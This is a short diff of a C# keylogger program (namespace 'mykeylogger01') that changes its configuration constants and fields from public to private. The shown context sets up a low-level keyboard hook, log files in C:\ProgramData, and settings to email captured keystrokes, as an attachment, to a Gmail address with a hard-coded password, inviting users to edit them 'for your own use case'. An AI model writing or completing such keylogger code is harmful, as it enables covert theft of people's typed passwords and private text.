@@ -11,21 +11,21 @@ namespace mykeylogger01
     class Program
     {
         // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //
-        public const string FROM_EMAIL_ADDRESS = "josh.cyber.test@gmail.com";
-        public const string FROM_EMAIL_PASSWORD = "dontlogintome";
-        public const string TO_EMAIL_ADDRESS = "josh.cyber.test@gmail.com";
-        public const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
-        public const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
-        public const bool INCLUDE_LOG_AS_ATTACHMENT = true;
-        public const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 300;
-        public const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
+        private const string FROM_EMAIL_ADDRESS = "josh.cyber.test@gmail.com";
+        private const string FROM_EMAIL_PASSWORD = "dontlogintome";
+        private const string TO_EMAIL_ADDRESS = "josh.cyber.test@gmail.com";
+        private const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
+        private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
+        private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
+        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 300;
+        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
         // ----------------------------- END -------------------------------- //
 
         private static int WH_KEYBOARD_LL = 13;
         private static int WM_KEYDOWN = 0x0100;
         private static IntPtr hook = IntPtr.Zero;
         private static LowLevelKeyboardProc llkProcedure = HookCallback;
-        public static string buffer = "";
+        private static string buffer = "";
         
         static void Main(string[] args)
         {
